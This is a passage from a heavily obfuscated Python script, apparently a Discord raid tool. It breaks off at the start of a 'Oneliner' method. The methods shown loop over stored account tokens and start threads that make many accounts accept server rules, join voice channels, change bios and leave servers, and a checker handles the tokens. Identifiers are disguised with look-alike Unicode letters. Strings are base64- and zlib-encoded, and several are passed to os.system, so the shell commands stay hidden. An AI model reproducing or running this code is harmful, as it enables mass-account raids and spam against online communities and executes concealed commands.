        𝘰𝘀.system(__𝗶𝗺𝙥𝗼𝘳𝙩__(𝗹𝙈𝘐𝘐𝗠𝙡𝘔𝗡𝘐𝗜𝗡𝗠𝘭𝘭𝗜𝙈𝗹𝗠𝙡𝘐𝘔𝙄𝗠𝗜𝘕𝗠𝙄𝗹𝘭𝗹𝘕𝙡[𝙧𝗼𝙪𝙣𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝘰𝗿𝙩__(𝙡𝘔𝘐𝗜𝗠𝙡𝗠𝙉𝙄𝙄𝗡𝘔𝘭𝗹𝙄𝗠𝙡𝙈𝙡𝗜𝗠𝗜𝗠𝙄𝙉𝘔𝗜𝙡𝘭𝙡𝘕𝗹[𝘳𝗼𝙪𝘯𝙙(𝙖𝙗𝙨(0.4980265294027091 + 0.8671617934451982j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝗽𝙧𝘪𝘯𝘁(𝗺𝙚𝘯𝙪)
        𝘴𝙚𝗿𝘷𝙚𝙧_𝗶𝘥 = 𝙞𝗻𝙥𝙪𝘵(__𝙞𝗺𝘱𝗼𝙧𝘵__(𝗹𝙈𝗜𝘐𝗠𝗹𝘔𝘕𝘐𝗜𝗡𝙈𝘭𝙡𝘐𝙈𝗹𝙈𝗹𝗜𝗠𝗜𝙈𝗜𝘕𝙈𝗜𝘭𝙡𝗹𝙉𝙡[𝗿𝙤𝘶𝙣𝙙(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝙤𝗿𝘵__(𝙡𝗠𝙄𝙄𝗠𝙡𝗠𝘕𝗜𝘐𝘕𝙈𝙡𝗹𝗜𝘔𝙡𝙈𝙡𝗜𝙈𝙄𝙈𝙄𝗡𝘔𝘐𝘭𝘭𝙡𝗡𝗹[𝙧𝙤𝘂𝙣𝗱(𝗮𝗯𝘴(0.9423376813439168 + 0.33466355391552666j))]).decompress(b'x\xda\x0b5\n\xabL\xc9\r\xab\xf4t\xcdq\xf5\xcft\xb4\x05\x00/e\x05l')).decode())
        if 𝘀𝘦𝗿𝘃𝗲𝗿_𝘪𝗱 == __𝘪𝗺𝗽𝘰𝙧𝘵__(𝘭𝘔𝗜𝙄𝙈𝙡𝘔𝘕𝗜𝙄𝙉𝗠𝙡𝘭𝙄𝗠𝙡𝙈𝘭𝘐𝘔𝘐𝘔𝘐𝗡𝘔𝗜𝘭𝙡𝘭𝘕𝗹[𝗿𝗼𝙪𝘯𝙙(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝙤𝗿𝙩__(𝘭𝗠𝗜𝙄𝗠𝙡𝗠𝘕𝗜𝘐𝗡𝙈𝙡𝗹𝗜𝘔𝙡𝗠𝘭𝗜𝙈𝗜𝙈𝗜𝘕𝗠𝗜𝙡𝗹𝗹𝙉𝘭[𝙧𝘰𝘶𝗻𝘥(𝙖𝙗𝘴(0.5594821126596166 + 0.8288424250808667j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝘦𝙣𝘶().main_menu()
        𝘰𝙨.system(__𝙞𝘮𝗽𝘰𝙧𝘵__(𝙡𝗠𝙄𝗜𝙈𝙡𝙈𝙉𝘐𝗜𝗡𝗠𝙡𝗹𝘐𝗠𝙡𝙈𝙡𝗜𝗠𝗜𝗠𝘐𝘕𝗠𝘐𝗹𝗹𝗹𝘕𝘭[𝗿𝘰𝘶𝗻𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝘳𝙩__(𝘭𝙈𝘐𝙄𝘔𝘭𝗠𝘕𝗜𝘐𝘕𝘔𝗹𝙡𝗜𝘔𝙡𝗠𝙡𝙄𝙈𝙄𝗠𝗜𝘕𝙈𝘐𝘭𝙡𝙡𝗡𝘭[𝙧𝘰𝙪𝙣𝘥(𝙖𝙗𝘴(0.45417128795187245 + 0.8909143848878731j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝘱𝘳𝘪𝘯𝘵(𝘮𝙚𝗻𝘶)
        for 𝙩𝘰𝗸𝘦𝙣 in 𝘁𝗼𝙠𝙚𝗻𝙨:
            𝘁𝗵𝙧𝙚𝙖𝙙𝘪𝘯𝗴.Thread(target=𝙖𝗰𝘤𝙚𝘱𝘵_𝙧𝘂𝙡𝘦𝘀𝙨, args=(𝘴𝗲𝙧𝘷𝗲𝗿_𝗶𝙙, 𝙩𝙤𝘬𝘦𝙣)).start()
        𝘦𝙭𝙞𝙩 = 𝘪𝗻𝗽𝘂𝙩(__𝗶𝙢𝘱𝘰𝙧𝘁__(𝙡𝗠𝙄𝗜𝙈𝙡𝙈𝘕𝙄𝙄𝘕𝙈𝗹𝗹𝙄𝗠𝘭𝙈𝘭𝙄𝙈𝗜𝗠𝙄𝗡𝙈𝗜𝗹𝘭𝘭𝘕𝘭[𝘳𝗼𝘂𝙣𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝗼𝘳𝘁__(𝘭𝗠𝗜𝘐𝗠𝘭𝘔𝘕𝘐𝘐𝘕𝘔𝗹𝘭𝗜𝙈𝗹𝙈𝗹𝗜𝗠𝗜𝘔𝘐𝙉𝗠𝙄𝘭𝙡𝘭𝙉𝘭[𝗿𝙤𝙪𝙣𝙙(𝗮𝗯𝘀(0.06042434617601378 + 0.9981727798278218j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝗲𝘹𝗶𝙩 = 𝗠𝘦𝙣𝘶().main_menu()
        𝗲𝘅𝘪𝘁()

    @𝘄𝙧𝘢𝗽𝙥𝙚𝘳
    def voicejoiner(self):
        𝘰𝘀.system(__𝗶𝙢𝗽𝗼𝙧𝘵__(𝘭𝘔𝗜𝙄𝙈𝘭𝘔𝙉𝘐𝘐𝘕𝗠𝙡𝗹𝗜𝗠𝙡𝙈𝘭𝗜𝘔𝘐𝙈𝘐𝗡𝗠𝙄𝗹𝙡𝗹𝗡𝙡[𝗿𝗼𝘶𝗻𝗱(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝗿𝙩__(𝗹𝗠𝗜𝗜𝙈𝙡𝗠𝗡𝘐𝘐𝘕𝗠𝙡𝗹𝘐𝙈𝗹𝗠𝙡𝙄𝙈𝘐𝘔𝗜𝙉𝗠𝗜𝗹𝙡𝙡𝙉𝗹[𝗿𝗼𝙪𝘯𝙙(𝙖𝘣𝙨(0.773912893839218 + 0.6332920595976292j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f\xcb\xf6M\x0f\xce\xb5,H\xca\r\xab\x04\x00\xb3\xb6\x0b2')).decode())
        𝘰𝙨.system(__𝗶𝘮𝘱𝘰𝗿𝙩__(𝘭𝘔𝗜𝘐𝘔𝘭𝗠𝘕𝙄𝙄𝘕𝘔𝙡𝙡𝙄𝙈𝘭𝗠𝗹𝗜𝗠𝘐𝙈𝗜𝙉𝗠𝗜𝗹𝗹𝙡𝘕𝙡[𝙧𝗼𝘂𝗻𝗱(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝙤𝘳𝙩__(𝘭𝗠𝙄𝘐𝙈𝗹𝙈𝘕𝙄𝙄𝙉𝘔𝗹𝗹𝙄𝗠𝘭𝙈𝗹𝙄𝙈𝘐𝙈𝙄𝗡𝘔𝙄𝘭𝗹𝙡𝘕𝙡[𝙧𝙤𝘶𝙣𝙙(𝗮𝗯𝘴(0.7967205380166362 + 0.6043479000563183j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝗽𝗿𝘪𝙣𝘵(𝗺𝙚𝗻𝙪)
        𝗴𝘶𝘪𝙡𝘥 = 𝘪𝘯𝘱𝘂𝘵(__𝙞𝙢𝗽𝗼𝘳𝘵__(𝗹𝘔𝘐𝘐𝗠𝙡𝙈𝘕𝙄𝙄𝗡𝙈𝙡𝗹𝘐𝘔𝙡𝘔𝗹𝘐𝙈𝗜𝙈𝙄𝗡𝗠𝙄𝙡𝘭𝙡𝘕𝗹[𝗿𝗼𝘂𝘯𝙙(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝘰𝗿𝘵__(𝗹𝗠𝗜𝘐𝗠𝘭𝘔𝗡𝘐𝘐𝗡𝗠𝙡𝙡𝘐𝘔𝘭𝙈𝗹𝘐𝙈𝙄𝗠𝗜𝗡𝘔𝘐𝘭𝘭𝗹𝗡𝙡[𝗿𝗼𝘂𝗻𝘥(𝘢𝗯𝘴(0.42495823587621984 + 0.9052129571327241j))]).decompress(b"x\xdaK56LJ56\xf4H\t\xcf)\x8erv\xf2\n\xf2(\xb1\x8c\x08v\xc9\xcc(\xf0L\x07\x00\x7f\xb7\t'")).decode().format(𝙧, 𝗹𝙘, 𝗿))
        if 𝙜𝙪𝗶𝘭𝗱 == __𝗶𝙢𝗽𝙤𝘳𝘵__(𝙡𝗠𝗜𝘐𝘔𝙡𝗠𝘕𝙄𝘐𝗡𝗠𝗹𝙡𝗜𝗠𝗹𝘔𝘭𝘐𝙈𝙄𝗠𝗜𝙉𝗠𝙄𝗹𝙡𝗹𝘕𝙡[𝘳𝙤𝙪𝗻𝙙(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝗼𝗿𝘵__(𝘭𝗠𝘐𝗜𝗠𝙡𝘔𝙉𝙄𝗜𝗡𝗠𝙡𝗹𝗜𝗠𝙡𝘔𝙡𝗜𝗠𝘐𝙈𝗜𝗡𝘔𝘐𝙡𝙡𝗹𝗡𝗹[𝗿𝘰𝘶𝘯𝙙(𝙖𝘣𝘀(0.022318407189921063 + 0.9997509133281673j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝗲𝙣𝙪().main_menu()
        𝗰𝘩𝗮𝘯𝗻𝗲𝘭 = 𝗶𝙣𝗽𝙪𝘵(__𝘪𝙢𝘱𝘰𝗿𝙩__(𝘭𝙈𝗜𝙄𝙈𝗹𝙈𝗡𝙄𝗜𝗡𝘔𝙡𝙡𝘐𝘔𝗹𝙈𝘭𝘐𝘔𝙄𝘔𝙄𝙉𝗠𝙄𝙡𝘭𝗹𝘕𝘭[𝘳𝘰𝘂𝘯𝘥(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝗼𝘳𝙩__(𝗹𝘔𝗜𝙄𝙈𝗹𝙈𝘕𝗜𝘐𝙉𝙈𝘭𝘭𝗜𝙈𝙡𝙈𝘭𝗜𝗠𝙄𝙈𝙄𝙉𝘔𝘐𝘭𝘭𝗹𝗡𝙡[𝗿𝗼𝘶𝙣𝘥(𝗮𝗯𝘀(0.15861466862652873 + 0.9873405627727935j))]).decompress(b'x\xdaK56LJ56tItw+M\xca\r+\xf6t\xcdq\x05\xf2S<\xfd\xbd\xdd\xb33\x1dm\x01\xa5\xef\n\x1c')).decode().format(𝗿, 𝗹𝗰, 𝘳))
        if 𝗰𝘩𝗮𝙣𝘯𝙚𝘭 == __𝘪𝘮𝗽𝘰𝘳𝘁__(𝘭𝙈𝙄𝘐𝗠𝗹𝙈𝘕𝗜𝙄𝙉𝗠𝘭𝘭𝘐𝙈𝙡𝘔𝙡𝗜𝙈𝘐𝙈𝙄𝙉𝗠𝙄𝘭𝗹𝙡𝘕𝗹[𝗿𝙤𝘂𝗻𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝗼𝘳𝘁__(𝗹𝙈𝙄𝗜𝘔𝗹𝙈𝗡𝘐𝙄𝙉𝗠𝗹𝘭𝗜𝘔𝙡𝙈𝘭𝘐𝙈𝗜𝗠𝗜𝗡𝘔𝗜𝘭𝙡𝙡𝗡𝗹[𝙧𝘰𝘂𝗻𝙙(𝘢𝙗𝘀(0.8499335378345111 + 0.5268899137999433j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝘦𝘯𝘶().main_menu()
        𝘰𝘴.system(__𝘪𝘮𝘱𝗼𝗿𝙩__(𝙡𝘔𝘐𝙄𝘔𝗹𝗠𝗡𝗜𝗜𝘕𝘔𝘭𝘭𝙄𝙈𝘭𝘔𝙡𝗜𝗠𝙄𝘔𝗜𝗡𝘔𝘐𝗹𝗹𝙡𝙉𝙡[𝘳𝗼𝘂𝙣𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝗼𝗿𝘵__(𝙡𝙈𝘐𝙄𝗠𝗹𝘔𝘕𝘐𝗜𝙉𝗠𝘭𝙡𝘐𝘔𝘭𝗠𝘭𝙄𝗠𝗜𝙈𝗜𝙉𝗠𝘐𝙡𝙡𝗹𝘕𝗹[𝗿𝗼𝘂𝗻𝘥(𝙖𝗯𝙨(0.09238447779737857 + 0.9957234095179773j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝗽𝙧𝘪𝙣𝘁(𝘮𝙚𝙣𝘂)
        for 𝘵𝗼𝗸𝗲𝙣 in 𝘵𝙤𝘬𝙚𝘯𝘀:
            𝘁𝗵𝙧𝙚𝗮𝙙𝙞𝗻𝙜.Thread(target=𝘃𝙘_𝙟𝗼𝙞𝙣𝘦𝗿, args=(𝙩𝙤𝗸𝙚𝘯, 𝙜𝘶𝙞𝗹𝘥, 𝙘𝙝𝘢𝙣𝙣𝘦𝘭)).start()
        𝘦𝙭𝘪𝙩 = 𝗶𝗻𝘱𝙪𝘁(__𝘪𝙢𝘱𝘰𝙧𝙩__(𝗹𝘔𝙄𝙄𝗠𝘭𝙈𝘕𝙄𝘐𝘕𝗠𝘭𝘭𝗜𝘔𝘭𝙈𝗹𝗜𝗠𝗜𝙈𝘐𝗡𝘔𝗜𝙡𝘭𝘭𝗡𝘭[𝗿𝗼𝘂𝙣𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝙤𝘳𝙩__(𝗹𝘔𝗜𝘐𝘔𝙡𝗠𝗡𝗜𝙄𝙉𝙈𝘭𝙡𝘐𝙈𝙡𝗠𝙡𝙄𝗠𝙄𝘔𝘐𝙉𝘔𝙄𝗹𝗹𝗹𝗡𝙡[𝗿𝙤𝘶𝗻𝗱(𝘢𝗯𝘴(0.5242537790217077 + 0.8515620794642388j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝗲𝘹𝗶𝘵 = 𝗠𝘦𝘯𝘂().main_menu()
        𝗲𝘅𝙞𝙩()

    @𝙬𝘳𝙖𝗽𝗽𝙚𝙧
    def Change_bio(self):
        𝘰𝘴.system(__𝙞𝗺𝙥𝘰𝙧𝘵__(𝗹𝘔𝗜𝗜𝘔𝘭𝙈𝙉𝙄𝙄𝗡𝗠𝗹𝙡𝗜𝗠𝙡𝙈𝗹𝗜𝘔𝙄𝗠𝘐𝘕𝙈𝙄𝗹𝗹𝙡𝙉𝘭[𝙧𝙤𝙪𝗻𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝘳𝙩__(𝙡𝙈𝘐𝙄𝙈𝗹𝙈𝙉𝙄𝙄𝗡𝙈𝗹𝗹𝗜𝙈𝙡𝘔𝗹𝘐𝘔𝙄𝙈𝙄𝘕𝗠𝘐𝗹𝗹𝘭𝙉𝙡[𝙧𝘰𝘂𝙣𝙙(𝘢𝘣𝘴(0.7787818924850868 + 0.6272947982705952j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f\xcc\xcd)\xf3t\xf5\xcb\x8f\x0c7\xcd\x8b\x8a\xf0\xb4\x05\x00\xe2\xba\x0c,')).decode())
        𝙤𝘴.system(__𝙞𝙢𝘱𝘰𝙧𝘁__(𝙡𝘔𝗜𝙄𝗠𝙡𝗠𝙉𝘐𝙄𝙉𝗠𝘭𝙡𝘐𝙈𝙡𝙈𝙡𝙄𝗠𝘐𝙈𝙄𝘕𝙈𝗜𝙡𝙡𝘭𝙉𝘭[𝙧𝘰𝘂𝗻𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝙧𝘁__(𝗹𝗠𝘐𝗜𝙈𝗹𝙈𝗡𝗜𝙄𝗡𝙈𝘭𝙡𝗜𝗠𝗹𝗠𝗹𝘐𝗠𝗜𝗠𝗜𝗡𝙈𝘐𝗹𝘭𝗹𝘕𝘭[𝘳𝘰𝙪𝙣𝘥(𝗮𝙗𝙨(0.7027687857437864 + 0.71141832544868j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝙥𝘳𝗶𝘯𝘵(𝘮𝗲𝙣𝘂)
        𝙗𝘪𝗼 = 𝗶𝘯𝙥𝘶𝘁(__𝗶𝙢𝘱𝙤𝗿𝘁__(𝘭𝘔𝗜𝙄𝙈𝘭𝙈𝘕𝘐𝘐𝗡𝗠𝙡𝗹𝘐𝘔𝙡𝘔𝘭𝘐𝘔𝗜𝘔𝘐𝘕𝘔𝗜𝗹𝙡𝘭𝙉𝙡[𝗿𝙤𝙪𝘯𝘥(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝘰𝗿𝘵__(𝙡𝗠𝙄𝗜𝙈𝗹𝗠𝘕𝙄𝘐𝘕𝘔𝙡𝙡𝘐𝘔𝘭𝙈𝘭𝗜𝙈𝗜𝗠𝗜𝙉𝙈𝗜𝗹𝗹𝗹𝘕𝘭[𝙧𝙤𝘂𝗻𝙙(𝗮𝙗𝙨(0.6690754389483897 + 0.743194494729354j))]).decompress(b'x\xdaK56LJ56tN\x0c\xb74O\x0b3H7\xc9O\x0c\xf6t\xb4\xb5\x05\x00X.\x07\x0e')).decode().format(𝗿, 𝙡𝗰, 𝘳))
        if 𝘣𝙞𝘰 == __𝗶𝗺𝙥𝗼𝙧𝘁__(𝘭𝙈𝙄𝙄𝘔𝙡𝙈𝙉𝘐𝗜𝗡𝗠𝙡𝗹𝙄𝙈𝗹𝘔𝗹𝘐𝘔𝗜𝗠𝘐𝗡𝘔𝙄𝘭𝙡𝗹𝙉𝙡[𝗿𝙤𝘂𝗻𝗱(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝗼𝗿𝘵__(𝘭𝘔𝙄𝗜𝙈𝘭𝗠𝗡𝘐𝙄𝗡𝗠𝗹𝗹𝙄𝗠𝘭𝘔𝘭𝘐𝙈𝙄𝙈𝘐𝗡𝘔𝘐𝗹𝙡𝘭𝗡𝗹[𝙧𝙤𝙪𝗻𝗱(𝙖𝘣𝘀(0.2470124637483342 + 0.9690123026840154j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝙚𝘯𝘶().main_menu()
        𝘰𝙨.system(__𝘪𝘮𝘱𝗼𝙧𝙩__(𝗹𝗠𝘐𝗜𝗠𝗹𝙈𝘕𝙄𝙄𝗡𝘔𝙡𝘭𝙄𝘔𝙡𝘔𝙡𝙄𝘔𝗜𝘔𝙄𝙉𝗠𝗜𝙡𝘭𝗹𝗡𝗹[𝗿𝙤𝙪𝙣𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝙧𝘁__(𝗹𝙈𝗜𝘐𝘔𝗹𝙈𝘕𝗜𝙄𝗡𝙈𝗹𝙡𝙄𝙈𝘭𝘔𝗹𝗜𝙈𝙄𝙈𝙄𝙉𝙈𝘐𝙡𝘭𝗹𝙉𝘭[𝙧𝘰𝙪𝘯𝗱(𝙖𝗯𝙨(0.6819897250522217 + 0.7313617538012191j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝙥𝗿𝙞𝘯𝘵(𝙢𝗲𝙣𝙪)
        for 𝘁𝘰𝙠𝘦𝘯 in 𝘵𝙤𝗸𝗲𝘯𝙨:
            𝘵𝙝𝘳𝗲𝘢𝙙𝘪𝗻𝗴.Thread(target=𝗯𝙞𝘰_𝙘𝘩𝘢𝗻𝗴𝗲𝘳, args=(𝘁𝙤𝙠𝙚𝘯, 𝘣𝘪𝘰)).start()
        𝗲𝘅𝗶𝘵 = 𝘪𝙣𝙥𝘂𝘁(__𝘪𝙢𝗽𝙤𝗿𝘵__(𝙡𝗠𝗜𝗜𝘔𝗹𝘔𝗡𝙄𝗜𝗡𝘔𝘭𝗹𝙄𝗠𝗹𝙈𝙡𝘐𝙈𝗜𝗠𝘐𝗡𝗠𝘐𝙡𝗹𝗹𝗡𝘭[𝙧𝙤𝙪𝗻𝘥(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝗼𝗿𝘵__(𝘭𝘔𝙄𝘐𝘔𝘭𝗠𝘕𝗜𝙄𝘕𝘔𝙡𝘭𝘐𝗠𝘭𝗠𝗹𝘐𝘔𝙄𝗠𝗜𝙉𝙈𝙄𝙡𝗹𝘭𝙉𝙡[𝙧𝗼𝙪𝙣𝘥(𝗮𝙗𝙨(0.805510955290865 + 0.592580881320346j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝗲𝙭𝙞𝘵 = 𝗠𝙚𝗻𝘂().main_menu()
        𝗲𝘹𝙞𝘵()

    @𝘄𝗿𝙖𝗽𝙥𝘦𝙧
    def leaver(self):
        𝗼𝘴.system(__𝘪𝙢𝘱𝗼𝙧𝙩__(𝙡𝗠𝗜𝘐𝗠𝘭𝙈𝗡𝘐𝘐𝙉𝗠𝘭𝗹𝙄𝙈𝗹𝗠𝗹𝙄𝙈𝘐𝘔𝙄𝗡𝘔𝙄𝗹𝗹𝘭𝘕𝗹[𝗿𝘰𝙪𝙣𝘥(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝙧𝘁__(𝘭𝗠𝙄𝗜𝗠𝗹𝘔𝘕𝙄𝘐𝗡𝘔𝗹𝙡𝘐𝘔𝙡𝗠𝗹𝗜𝙈𝗜𝙈𝗜𝙉𝗠𝙄𝘭𝙡𝗹𝘕𝗹[𝘳𝗼𝙪𝗻𝘥(𝘢𝘣𝘴(0.5214881331167244 + 0.8532585346883051j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0fq\x0f\xcbH\xc9\r\xab\x04\x00\x89(\t\xaf')).decode())
        𝘰𝙨.system(__𝘪𝙢𝙥𝗼𝗿𝙩__(𝙡𝗠𝙄𝘐𝘔𝘭𝙈𝘕𝗜𝙄𝗡𝗠𝗹𝗹𝘐𝘔𝗹𝗠𝗹𝗜𝙈𝘐𝙈𝗜𝗡𝘔𝘐𝗹𝗹𝙡𝘕𝘭[𝗿𝘰𝘂𝙣𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝙤𝘳𝘁__(𝗹𝗠𝘐𝙄𝗠𝙡𝘔𝙉𝗜𝘐𝗡𝗠𝗹𝗹𝗜𝙈𝘭𝘔𝘭𝘐𝙈𝘐𝗠𝙄𝗡𝗠𝙄𝗹𝗹𝗹𝗡𝗹[𝘳𝗼𝘶𝙣𝗱(𝘢𝘣𝘴(0.27007723099442027 + 0.9628386621331668j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝙥𝙧𝙞𝘯𝙩(𝗺𝘦𝙣𝘂)
        𝗴𝘶𝙞𝙡𝗱 = 𝘪𝙣𝗽𝘂𝙩(𝗰𝙤𝘯𝘀𝗼𝗹𝘦.prompt(__𝗶𝘮𝘱𝙤𝙧𝘵__(𝘭𝙈𝘐𝗜𝗠𝙡𝘔𝙉𝘐𝘐𝗡𝙈𝙡𝗹𝗜𝙈𝗹𝘔𝙡𝗜𝗠𝙄𝙈𝙄𝘕𝙈𝗜𝗹𝘭𝙡𝗡𝗹[𝙧𝘰𝘶𝗻𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝙧𝘵__(𝘭𝙈𝘐𝗜𝗠𝗹𝘔𝘕𝙄𝙄𝙉𝘔𝙡𝘭𝘐𝗠𝙡𝙈𝗹𝘐𝗠𝙄𝙈𝙄𝘕𝙈𝘐𝘭𝘭𝗹𝘕𝗹[𝗿𝙤𝙪𝙣𝙙(𝙖𝙗𝙨(0.27893710658336235 + 0.9603093723227437j))]).decompress(b'x\xda\x0b2\x0c\xf3\nq\rL\x0f\x0e\r\xb4\x05\x00\x17\x8b\x03\xab')).decode()))
        if 𝙜𝘶𝘪𝙡𝙙 == __𝗶𝘮𝘱𝘰𝘳𝘁__(𝙡𝗠𝙄𝙄𝗠𝗹𝗠𝘕𝘐𝙄𝙉𝘔𝘭𝘭𝙄𝙈𝙡𝙈𝙡𝘐𝘔𝗜𝙈𝙄𝗡𝙈𝗜𝗹𝙡𝘭𝙉𝙡[𝗿𝙤𝙪𝙣𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝘰𝙧𝙩__(𝙡𝘔𝗜𝗜𝙈𝙡𝗠𝘕𝗜𝘐𝘕𝙈𝗹𝗹𝗜𝗠𝘭𝗠𝙡𝘐𝘔𝘐𝘔𝗜𝘕𝗠𝙄𝘭𝘭𝘭𝗡𝗹[𝙧𝘰𝘂𝘯𝙙(𝘢𝘣𝘀(0.9332028456449561 + 0.3593500367053775j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝗠𝘦𝘯𝘶().main_menu()
        𝗮𝗿𝗴𝘴 = [(𝘵𝙤𝘬𝘦𝗻, 𝗴𝙪𝗶𝙡𝙙) for 𝘵𝙤𝙠𝙚𝙣 in 𝘵𝗼𝙠𝙚𝙣𝙨]
        𝘀𝙚𝙡𝗳.run(𝘀𝙚𝘭𝗳.raider.leaver, 𝙖𝗿𝙜𝙨)

    @𝘸𝙧𝘢𝘱𝗽𝙚𝘳
    def Checker(self):
        𝗼𝘴.system(__𝘪𝘮𝗽𝗼𝗿𝘵__(𝘭𝗠𝙄𝙄𝙈𝗹𝘔𝙉𝙄𝗜𝘕𝗠𝙡𝙡𝗜𝘔𝗹𝙈𝗹𝙄𝘔𝗜𝘔𝙄𝘕𝗠𝙄𝙡𝙡𝙡𝙉𝗹[𝘳𝙤𝘶𝙣𝘥(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝗿𝘁__(𝙡𝘔𝙄𝙄𝘔𝙡𝗠𝗡𝗜𝙄𝗡𝗠𝗹𝗹𝙄𝙈𝗹𝗠𝙡𝘐𝘔𝗜𝘔𝗜𝙉𝗠𝙄𝘭𝙡𝗹𝘕𝘭[𝙧𝗼𝘂𝗻𝘥(𝘢𝘣𝘴(0.30360622019621264 + 0.9527975981593199j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0fs\xb7,\x8a\n7I\x0f4\xca\xc8\x894*\xc9IN\xb7\xb5\x05\x00\x11\xc3\rP')).decode())
        𝙨𝗮𝘷𝗲_𝘵𝙤𝗸𝘦𝘯𝙨(__𝙞𝗺𝗽𝙤𝘳𝙩__(𝙡𝙈𝘐𝘐𝗠𝙡𝘔𝘕𝙄𝗜𝗡𝘔𝙡𝗹𝙄𝘔𝘭𝙈𝗹𝙄𝗠𝗜𝙈𝙄𝗡𝘔𝘐𝘭𝗹𝘭𝗡𝘭[𝘳𝙤𝘂𝗻𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝗿𝙩__(𝘭𝗠𝘐𝘐𝘔𝘭𝘔𝙉𝗜𝙄𝙉𝗠𝗹𝙡𝘐𝘔𝘭𝗠𝙡𝙄𝘔𝙄𝙈𝙄𝗡𝙈𝙄𝘭𝙡𝙡𝘕𝙡[𝘳𝙤𝙪𝗻𝘥(𝗮𝗯𝘀(0.7739113905822695 + 0.6332938966443762j))]).decompress(b'x\xda\x8brw3\x88\x0c\xb64H2*\xc9I\xca\xf3-M\xf1\xc80\x00\x00A\x1b\x06w')).decode())
        𝗲𝙭𝘪𝘁 = 𝙞𝗻𝗽𝘂𝘁(__𝘪𝙢𝘱𝙤𝙧𝘵__(𝘭𝘔𝙄𝙄𝘔𝙡𝙈𝘕𝗜𝙄𝗡𝗠𝙡𝗹𝗜𝗠𝗹𝙈𝙡𝗜𝗠𝘐𝗠𝙄𝘕𝙈𝘐𝘭𝘭𝙡𝙉𝙡[𝘳𝗼𝘶𝙣𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝘰𝗿𝘵__(𝘭𝘔𝘐𝗜𝘔𝗹𝙈𝘕𝗜𝗜𝗡𝙈𝙡𝗹𝘐𝙈𝙡𝘔𝘭𝙄𝗠𝘐𝙈𝙄𝗡𝗠𝗜𝗹𝗹𝘭𝗡𝙡[𝘳𝙤𝘶𝗻𝙙(𝘢𝗯𝘀(0.8710582992926618 + 0.49117964049151686j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝙚𝘹𝗶𝘁 = 𝗠𝗲𝗻𝘂().main_menu()
        𝗲𝙭𝙞𝙩()

    @𝘸𝘳𝘢𝙥𝗽𝙚𝙧
    def Oneliner(self):
